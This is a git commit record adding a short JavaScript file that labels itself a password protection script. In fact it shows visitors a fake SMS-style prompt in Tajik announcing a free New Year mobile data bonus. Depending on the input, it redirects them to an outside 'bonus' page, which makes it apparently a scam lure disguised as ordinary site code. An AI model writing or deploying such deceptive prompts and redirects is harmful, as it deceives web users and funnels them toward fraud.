abf53c1c0ad5b2bc14e940be49636c35c8bee7b4
ekpanewblog5 <ukpehaitid3@gmail.com>
2025-12-28 10:06:11 +0100

    Create tajik-active.js

---
+++ tajik-active.js
@@ -0,0 +1,10 @@
+  
+/* Password Protection Script by www.onlineofferz.xyz*/
+var password = 'БОНУС ГИРЕД'
+password = prompt(
+  'SMS: Табрик мекунем! Рақами мобилии шумо ҳуқуқ дорад, ки бонуси ройгони соли нави маълумот гирад. Лутфан OK-ро пахш кунед, то Фаъолсозӣ кунед.',
+  'БОНУС ГИРЕД'
+);
+if (password != 'БОНУС ГИРЕД') {
+  location.href = 'https://ohfer.org/bonus.html';
+}
